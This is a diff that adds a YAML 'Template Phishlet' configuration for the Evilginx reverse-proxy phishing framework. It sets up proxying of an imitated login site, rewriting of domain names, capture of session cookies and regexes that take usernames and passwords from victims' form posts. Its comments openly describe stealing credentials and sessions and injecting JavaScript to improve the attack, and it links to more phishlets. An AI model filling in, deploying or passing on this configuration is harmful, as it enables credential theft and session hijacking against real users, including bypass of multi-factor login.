@@ -1,0 +1,64 @@
+# Created:    {date}
+# Modified:   {date}
+
+name: 'Template Phishlet'
+author: 'Rhys McClew'
+min_ver: '3.2.0'
+
+# Indicates the domain and subdomains to proxy.
+# The phish_sub is the subdomain that the phishing page will imitate.
+proxy_hosts:
+  - { phish_sub: 'www', orig_sub: 'www', domain: '{domain}', session: true, is_landing: true }
+
+# Allows the phishlet to replace instances of the actual domain name with the phishing domain, which is critical for the phishing page to function correctly.
+sub_filters: 
+  - { hostname: '{hostname}', sub: 'www', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']} 
+  - { hostname: '{hostname}', sub: 'www', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['application/x-www-form-urlencoded']}
+
+# Identifies the cookies that should be captured from the victim's browser to gain access to the victim's session.
+auth_tokens:
+  - domain: '{domain}'
+    keys: ['session']
+
+# This field determines the credentials that the phishlet is engineered to steal.
+# The key is the name of the credential and search is a regex that the program will use to identify and extract these details from the user's input.
+creds:
+  - key: 'username'
+    search: ['(.*)']
+    type: 'post'
+  - key: 'password'
+    search: ['(.*)']
+    type: 'post'
+
+# Defines the URLs that Evilginx will treat as the authenticated URLs.
+# After the victim logs in, Evilginx will look out for a redirect to one of these URLs, at which point it will steal the listed auth_tokens.
+auth_urls:
+  - url_regex: 'https://{hostname}/login'
+    valid_statuses: [200]
+
+# Stops working if removed.
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+# Here you specify the identifiers of the username and password fields in the login form on the original webpage.
+# The url is the link of the page where the victim enters their credentials.
+login:
+  username: user
+  password: pass
+  url: https://www.{domain}/login
+
+# force_post: If set to true, it forces the alteration of HTTP method from GET to POST.
+# is_landing: If set to true, it means that the page is a landing page for the phishing attack.
+# js_inject: This is where you can write some JavaScript to be injected in the webpage. It's typically used to enhance the phishing attack and ensure a smoother victim experience.
+# domain: This is a template variable used to replace target hostname used in phishlet configuration.
+
+# More phishlets here:
+# https://github.com/simplerhacking/Evilginx3-Phishlets
+# https://www.simplerhacking.com
